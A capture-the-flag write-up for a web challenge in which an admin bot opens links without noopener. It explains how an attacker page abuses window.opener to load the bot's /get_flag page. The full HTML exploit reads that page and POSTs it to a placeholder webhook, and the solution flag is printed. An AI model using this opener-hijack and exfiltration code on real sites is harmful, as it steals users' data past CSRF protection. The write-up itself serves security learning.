# Window of Opportunity

- **Author:** p._.k
- **Category:** Web
- **Solves:** 98

## Description

The admin bot loves opening URLs. I implemented CSRF protection, but it seems as though I'm forgetting something. Can you find the issue? Author: p._.k <http://34.134.162.213:17001> [window_of_opportunity.zip](<https://ctf.l3ak.team/files/58130345fb4a47991e6e300c2e1d700f/Window_of_Opportunity.zip?token=eyJ1c2VyX2lkIjoxMTQ3LCJ0ZWFtX2lkIjo1NjIsImZpbGVfaWQiOjgzfQ.aHnCww.GDFPURSeS20FES93HVq_VEqhd8c>)
Window_of_Opportunity.zip

---

## Solution

The trick is to realize that, in opening the window to the user's url via "_blank" without "noopener" and "noreferrer", the page being visited has access to the `window.opener` object. This allows the players to visit the `/get_flag` endpoint on behalf of the admin bot's context window, bypassing CSRF protections and obtaining the flag.

Example exploit page:

```html
<!DOCTYPE html>
<html>
<head><title>Exploit</title></head>
<body>
<h1>Hello...</h1>
<script>
  if(window.opener) {
    window.opener.location = "http://127.0.0.1:3000/get_flag";

    setTimeout(() => {
      try {
        const flag = window.opener.document.body.innerText;
        console.log(flag)

        fetch("[WEBHOOK URL]", {
            method: "POST",
            body: `{"flag": ${flag}}`
        })
      } catch(e) {
        console.error("Could not read flag:", e);
      }
    }, 200);
  } else {
    document.body.innerText = "No opener found";
  }
</script>
</body>
</html>
```

Flag: `L3AK{T1gh7_CSRF_y3t_w1nd0w_0p3n3r_w1n5!}`
